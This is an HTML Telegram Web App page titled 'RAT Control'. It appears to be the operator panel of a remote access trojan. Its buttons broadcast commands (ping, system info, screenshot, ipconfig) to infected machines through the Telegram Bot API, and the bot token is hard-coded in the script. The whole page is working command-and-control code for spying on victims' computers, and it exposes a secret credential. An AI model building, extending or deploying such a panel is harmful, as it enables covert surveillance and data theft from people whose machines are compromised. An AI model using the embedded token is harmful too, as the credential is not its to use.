<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAT Control</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <h1>📡 RAT CONTROL</h1>
    <button onclick="sendCommand('ping')">🏓 Ping</button>
    <button onclick="sendCommand('system')">💻 System</button>
    <button onclick="sendCommand('screenshot')">🖼️ Screenshot</button>
    <button onclick="sendCommand('ipconfig')">🌐 IPConfig</button>
    <div id="log"></div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        function sendCommand(cmd) {
            const chatId = "-1";
            fetch(`https://api.telegram.org/bot8740297103:AAGtEIQWroecRaVsgmQcGMKkfK3UABAAJW8/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `/broadcast ${cmd}`
                })
            });
            document.getElementById('log').innerHTML += `<br>✅ Команда отправлена: ${cmd}`;
        }
    </script>
</body>
</html>
